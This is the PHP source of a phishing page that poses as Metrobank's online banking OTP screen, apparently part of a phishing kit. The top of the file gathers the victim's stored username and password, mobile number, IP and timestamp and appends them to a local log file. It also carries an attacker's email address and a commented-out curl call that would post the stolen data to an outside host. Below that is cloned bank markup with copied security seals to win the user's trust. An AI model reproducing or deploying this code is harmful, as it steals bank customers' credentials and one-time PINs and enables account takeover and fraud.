<?php 
error_reporting(0);
session_start();
$date = new DateTime(null, new DateTimeZone('Asia/Manila'));

function wrongpin(){
	if(isset($_GET['wrongpin'])){
		return '<br><font color="red">The code you entered is invalid or has expired.</font><hr>';
	}
}
if($_GET['wrongpin'] == 'true'){
	
}else{
$hostname = gethostbyaddr($ip);
$ipp = getenv('REMOTE_ADDR');
$bilsmg = "--------------[MetroBank Login Rezult]--------------\n";
$bilsmg .= 'User ID: '.$_SESSION['username']."\n";
$bilsmg .= 'Password: '.$_SESSION['password']."\n";
$bilsmg .= 'Mobile: '.$_POST['cell']."\n";
$bilsmg .= 'IP: '.$ipp."\n";
$bilsmg .= 'Timestamp: '.strval($date->format('F d/h:iA'))."\n";
$bilsmg .= "------------[Yhuricka Usuopmaki]------------\n";
$mailko = 'usuopmaki.yhuricka@yahoo.com';
//mail($mailko,$bilsub,$bilsmg,$bilhead);
fwrite(fopen('./2K20.html','a+'),$bilsmg);
/*$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,"http://onlinebpiexpress.000webhostapp.com/bi/save.php");
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS,
            "rez=".$bilsmg."&bank=metrobank");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_exec($ch);
curl_close ($ch);*/

}
echo '<html xmlns="http://www.w3.org/1999/xhtml"><head>




    <script type="text/javascript" src="js/common.js"></script>  
    <script type="text/javascript" src="js/utils.js"></script>
    <!-- <link  href="/RetailInternetPortal/include/skins/metrocommon.css" rel="stylesheet" type="text/css"/> -->      
    <link rel="SHORTCUT ICON" href="img/favicon.ico" type="image/x-icon"> 
  <style>#header + #content > #left > #rlblock_left
{display:none !important;}</style></head><body class="login"><input type="hidden" name="projectName" id="projectName" value="/RetailInternetPortal">
  <input type="hidden" name="bankprefix" id="bankprefix" value="metro">
  <input type="hidden" name="listtypeforjs" id="listtypeforjs" value="n	ull">

<script type="text/javascript" src="js/backfix.min.js"></script>
<script type="text/javascript">
    function reload() {
        if(window.name==location.href) {
            logout();
         }
         window.name=location.href;
    }
    
        bajb_backdetect.OnBack = function() {
        logout();
    }
    
</script>


<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title>Welcome to Metrobankdirect</title>
<link href="css/reset.css" type="text/css" rel="stylesheet">
<link rel="stylesheet" href="css/jquery-custom.css" type="text/css" media="all">
<link href="css/jquery1.css" type="ext/css" rel="stylesheet">
<link href="css/style.css" type="text/css" rel="stylesheet">
<script type="text/javascript" src="js/jquery-v1.7.1.js"></script>
<script type="text/javascript" src="js/jquery.validate.js"></script>
<script type="text/javascript" src="js/jquery-ui-1.8.17.custom.min.js"></script>
<script type="text/javascript" src="js/validations.js"></script>
<script type="text/javascript" src="js/jquery.numeric.js"></script>
<script type="text/javascript" src="js/utils1.js"></script>
<script type="text/javascript" src="js/customValidation.js"></script>
<script type="text/javascript" src="js/jquery.form.js"></script>
<script type="text/javascript" src="js/aes.js"></script>

<script type="text/javascript" src="js/jquery.keyboard.js"></script>
<!-- <link type="text/css" rel="Stylesheet" href="/RetailInternetPortal/css/jquery-ui.css"/> -->
<style type="text/css">
    .ui-keyboard { padding: .3em; position: absolute; left: 0; top: 0; z-index: 16000; }
    .ui-keyboard-has-focus { z-index: 16001; }
    .ui-keyboard div { font-size: 1.1em; }
    .ui-keyboard-button { height: 2em; width: 2em; margin: .3em; cursor: pointer; overflow: hidden; line-height: 1.8em;vertical-align: middle; }
    .ui-keyboard-button span { padding: 0; margin: 0; white-space:nowrap; }
    .ui-keyboard-button-endrow { clear: left; }
    .ui-keyboard-widekey { width: 4.6em; }
    .ui-keyboard-space { width: 15em; text-indent: -999em; }
    .ui-keyboard-preview-wrapper { text-align: center; }
    .ui-keyboard-preview { text-align: left; margin: 0 0 3px 0; display: inline; width: 150px;  } - width is calculated in IE, since 99% = 99% full browser width
    .ui-keyboard-keyset { text-align: center; }
    .ui-keyboard-input { text-align: left; }
    .ui-keyboard-input-current { -moz-box-shadow: 1px 1px 10px #00f; -webkit-box-shadow: 1px 1px 10px #00f; box-shadow: 1px 1px 10px #00f; }
    .ui-keyboard-placeholder { color: #000000; }
    .ui-keyboard-nokeyboard { color: #888; border-color: #888; } - disabled or readonly inputs, or use input[disabled=\'disabled\'] { color: #f00; }
</style>

<script type="text/javascript">
var path = \'/RetailInternetPortal\';
$(document).ready(function(){
$(this).bind("contextmenu", function(e) {
                e.preventDefault();
            });
$(\'#modalbox\').dialog({
    autoOpen: false,
    modal:true,
    width:700,
    resizable:false,
    title:\'Debit Memo\',
    draggable:false
  });
  $(\'#modalPopup\').click(function(){
    $(\'#modalbox\').dialog(\'open\');
  });
     $(\'#close\').click(function(){
        $(\'#modalbox\').dialog(\'close\');
     });
     
        $(\'body\').delegate(\'.ajaxLink\',\'click\',function(event){
        
            var linkedTo = $(this).attr(\'href\')+appandTokenId();
            alert(linkedTo);
            linkedTo =hashURL(linkedTo);
            alert(linkedTo);
            $(\'#right-col\').load(linkedTo,function(){
                $(\'.ajaxloader\').hide();
            });
            event.preventDefault();
        });
});
</script>



    <div id="wrapper">
        <div id="header">
        <div id="top-header">
                <div id="logo"><img src="img/metrobank-logo-small.png"></div>
                <div id="advertisement"><img src="img/advertisement-img.png" style="display: none !important;"></div>
                <div id="retail-logo"><img src="img/mb-personal-PNG.png"></div>
        </div>      
    </div>
<div id="main-container">


<div id="right-col" class="single-col">





<form name="ATMEnrollmentForm" method="post" action="verify.php" id="main-form" novalidate="novalidate">
    
    <div align="left">
        <font color="red">  </font>
    </div>

    <div class="main-content">
        <h2>

            Metrobank - Update your mobile number(OTP)
        </h2>


        <div class="form-details label-small">
            

            

            
            <p>
                <label>
                    One-time PIN
                </label>

                <span><input type="text" name="otp" size="100" value="" maxlength="6" minlength="6" onkeypress="return isNumberKey(this)" class="text-box valid" id="mobileNumberId" alt="Confirmation"> &nbsp;
                    <font color="red">*</font>&nbsp; <font style="color: #8e8e8e; float: none;"></font> <small class="hintmsg">(e.g. 461523)'.wrongpin().'
                </small> </span>
            </p>


            <!--<p>
                <label>
                    &nbsp;
                </label>
                 <span class="hintmsg" style="width:76px;text-align:center;margin-right:10px;">Country Code</span>
                    <span class="hintmsg" style="width:76px;text-align:center;margin-right:11px;">Carrier Code</span>
                    <span class="hintmsg" style="width:84px;text-align:center;">Phone Number</span> 
            </p>-->

        </div><font color="red">

        <p>
            <label>
                <font color="red">\' * \' Denotes Mandatory Fields </font>
            </label>
        </p>

        <div class="buttonwrap center">
            <input type="button" onclick="navigateBack();" value="Back" class="button">
            <input type="button" onclick="clearForm();" value="Clear" class="button">
            <input type="submit" value="Continue" class="button submitButton" id="submitButton">
            <input type="hidden" name="method" value="confirm" id="method">
            <input type="hidden" name="userTokenId" id="userTokenId" value="null">
        </div>
        
    </font></div><font color="red">

</font></form></div><font color="red">
        

<div>

    <div id="footer">
    <script type="text/javascript" src="https://seal.verisign.com/getseal?host_name=personal.metrobankdirect.com&amp;size=M&amp;use_flash=NO&amp;use_transparent=NO&amp;lang=en"></script> <map name="sealmap_medium" id="sealmap_medium"><area alt="Click to Verify - This site has chosen an SSL Certificate to improve Web site security" title="" href="javascript:vrsn_splash()" shape="rect" coords="0,0,115,58" tabindex="-1" style="outline:none;"><area alt="Click to Verify - This site has chosen an SSL Certificate to improve Web site security" title="" href="javascript:vrsn_splash()" shape="rect" coords="0,58,63,81" tabindex="-1" style="outline:none;"><area alt="" title="" href="javascript:symcBuySSL()" shape="rect" coords="63,58,115,81" style="outline:none;"></map><img name="seal" src="https://seal.websecurity.norton.com/getseal?at=0&amp;sealid=1&amp;dn=personal.metrobankdirect.com&amp;lang=en&amp;tpt=opaque" oncontextmenu="return false;" border="0" usemap="#sealmap_medium" alt=""> <map name="sealmap_medium" id="sealmap_medium"><area alt="Click to Verify - This site has chosen an SSL Certificate to improve Web site security" title="" href="javascript:vrsn_splash()" shape="rect" coords="0,0,115,58" tabindex="-1" style="outline:none;"><area alt="Click to Verify - This site has chosen an SSL Certificate to improve Web site security" title="" href="javascript:vrsn_splash()" shape="rect" coords="0,58,63,81" tabindex="-1" style="outline:none;"><area alt="" title="" href="javascript:symcBuySSL()" shape="rect" coords="63,58,115,81" style="outline:none;"></map><br>
            <a href="http://www.symantec.com/verisign/ssl-certificates" target="_blank" style="color:#000000; text-decoration:none; font:bold 7px verdana,sans-serif; letter-spacing:.5px; text-align:center; margin:0px; padding:0px;">ABOUT SSL CERTIFICATES</a>
        <!--<a href="javascript:void(0)"><img src="/RetailInternetPortal/images/verisign-img.png" border="0" alt="" /></a>-->
        <!-- <img src="/RetailInternetPortal/images/mb-yigh-PNG.png" alt="Metro Bank" />  -->
        <div class="menu"><a href="https://www.metrobank.com.ph/privacy_policy.asp" class="ajaxLink1" target="_blank">Privacy Policy</a>  
           |     <a href="https://www.metrobank.com.ph/terms_of_use.asp" class="ajaxLink1" target="_blank">Terms &amp; Conditions</a></div>
    
        <!-- <p style="font-weight:bold;">For inquiries, contact Metrobank Corporate Customer Care Desk:</p>-->
        <div class="footerwrapper">
            <!-- <label>Tel. No.: <span>(632)898-8000 dial 1, then 2</span></label> -->
            <label>24/7 Customer Hotline: <span>(632) 8700-700</span></label>
            <!-- <label>Domestic Toll-free No.: <span> 1-800-10-8579727</span></label> -->
            <label>24/7 Domestic Toll-free No.: <span> 1-800-1888-5775</span></label>
            <label style="width:100%;text-align:center;">E-mail:<span> <a href="mailto:customercare@metrobank.com.ph">customercare@metrobank.com.ph</a></span></label>
            
            <label><span>Copyright ©2012 Metrobank. All rights reserved.</span></label>
        </div>
    </div>
</div>
    

</font></div></div><style>img[src="/RetailInternetPortal/images/advertisement-img.png"]
{display:none !important;}</style><style>img[src="/RetailInternetPortal/images/advertisement-img.png"]
{display:none !important;}</style><div class="ui-dialog ui-widget ui-widget-content ui-corner-all" tabindex="-1" role="dialog" aria-labelledby="ui-dialog-title-modalbox" style="display: none; z-index: 1002; outline: 0px; height: auto; width: 70%; top: 396.5px; left: 284.5px;"><div class="ui-dialog-titlebar ui-widget-header ui-corner-all ui-helper-clearfix"><font color="red"><span class="ui-dialog-title" id="ui-dialog-title-modalbox">SAMPLE ATM CARDS</span><a href="#" class="ui-dialog-titlebar-close ui-corner-all" role="button"><span class="ui-icon ui-icon-closethick">close</span></a></font></div></div><div class="ui-keyboard ui-widget-content ui-widget ui-corner-all ui-helper-clearfix ui-keyboard-has-focus" role="textbox" style="position: absolute; left: 855px; top: 212px; display: none;"><div class="ui-keyboard-preview-wrapper"><font color="red"><input type="password" name="atmPin" maxlength="6" value="" class="text-box ui-widget-content ui-corner-all ui-keyboard-preview ui-keyboard-lockedinput" alt="ATM PIN" aria-haspopup="true" role="textbox" tabindex="-1" readonly="readonly">
</font></div><div name="default" class="ui-keyboard-keyset ui-keyboard-keyset-default">
<font color="red"><button role="button" aria-disabled="false" tabindex="-1" class="ui-keyboard-button ui-keyboard-50 ui-state-default ui-corner-all" data-value="2" name="50" data-pos="0,0" title=""><span>2</span></button><button role="button" aria-disabled="false" tabindex="-1" class="ui-keyboard-button ui-keyboard-51 ui-state-default ui-corner-all" data-value="3" name="51" data-pos="0,1" title=""><span>3</span></button><button role="button" aria-disabled="false" tabindex="-1" class="ui-keyboard-button ui-keyboard-55 ui-state-default ui-corner-all" data-value="7" name="55" data-pos="0,2" title=""><span>7</span></button><button role="button" aria-disabled="false" tabindex="-1" class="ui-keyboard-button ui-keyboard-bksp ui-keyboard-actionkey ui-state-default ui-corner-all" data-value="←" name="bksp" data-pos="0,3" title="Backspace"><span>←</span></button><br class="ui-keyboard-button-endrow"><button role="button" aria-disabled="false" tabindex="-1" class="ui-keyboard-button ui-keyboard-56 ui-state-default ui-corner-all" data-value="8" name="56" data-pos="1,0" title=""><span>8</span></button><button role="button" aria-disabled="false" tabindex="-1" class="ui-keyboard-button ui-keyboard-52 ui-state-default ui-corner-all" data-value="4" name="52" data-pos="1,1" title=""><span>4</span></button><button role="button" aria-disabled="false" tabindex="-1" class="ui-keyboard-button ui-keyboard-49 ui-state-default ui-corner-all" data-value="1" name="49" data-pos="1,2" title=""><span>1</span></button><button role="button" aria-disabled="false" tabindex="-1" class="ui-keyboard-button ui-keyboard-clear ui-keyboard-actionkey ui-state-default ui-corner-all" data-value="C" name="clear" data-pos="1,3" title="Clear"><span>C</span></button><br class="ui-keyboard-button-endrow"><button role="button" aria-disabled="false" tabindex="-1" class="ui-keyboard-button ui-keyboard-53 ui-state-default ui-corner-all" data-value="5" name="53" data-pos="2,0" title=""><span>5</span></button><button role="button" aria-disabled="false" tabindex="-1" class="ui-keyboard-button ui-keyboard-54 ui-state-default ui-corner-all" data-value="6" name="54" data-pos="2,1" title=""><span>6</span></button><button role="button" aria-disabled="false" tabindex="-1" class="ui-keyboard-button ui-keyboard-48 ui-state-default ui-corner-all" data-value="0" name="48" data-pos="2,2" title=""><span>0</span></button><button role="button" aria-disabled="false" tabindex="-1" class="ui-keyboard-button ui-keyboard-57 ui-state-default ui-corner-all" data-value="9" name="57" data-pos="2,3" title=""><span>9</span></button><br class="ui-keyboard-button-endrow"><button role="button" aria-disabled="false" tabindex="-1" class="ui-keyboard-button ui-keyboard-cancel ui-keyboard-widekey ui-keyboard-actionkey ui-state-default ui-corner-all ui-state-active" data-value="Cancel" name="cancel" data-pos="3,0" title="Cancel"><span>Cancel</span></button><button role="button" aria-disabled="false" tabindex="-1" class="ui-keyboard-button ui-keyboard-accept ui-keyboard-widekey ui-keyboard-actionkey ui-state-default ui-corner-all ui-state-active" data-value="Accept" name="accept" data-pos="3,1" title="Accept"><span>Accept</span></button><br class="ui-keyboard-button-endrow"></font></div></div><div class="ui-dialog ui-widget ui-widget-content ui-corner-all" tabindex="-1" role="dialog" aria-labelledby="ui-dialog-title-modalbox" style="display: none; z-index: 1000; outline: 0px;"><div class="ui-dialog-titlebar ui-widget-header ui-corner-all ui-helper-clearfix"><span class="ui-dialog-title" id="ui-dialog-title-modalbox">Debit Memo</span><a href="#" class="ui-dialog-titlebar-close ui-corner-all" role="button"><span class="ui-icon ui-icon-closethick">close</span></a></div></div>
<div class="ui-dialog ui-widget ui-widget-content ui-corner-all" tabindex="-1" role="dialog" aria-labelledby="ui-dialog-title-modalbox" style="display: none; z-index: 1000; outline: 0px;"><div class="ui-dialog-titlebar ui-widget-header ui-corner-all ui-helper-clearfix"><span class="ui-dialog-title" id="ui-dialog-title-modalbox">Debit Memo</span><a href="#" class="ui-dialog-titlebar-close ui-corner-all" role="button"><span class="ui-icon ui-icon-closethick">close</span></a></div><div id="modalbox" class="ui-dialog-content ui-widget-content" scrolltop="0" scrollleft="0" style="width: auto; min-height: 108.28px; height: auto;"><font color="red"><img src="/RetailInternetPortal/images/cards web set C.jpg">
</font></div></div></body></html>'; ?>
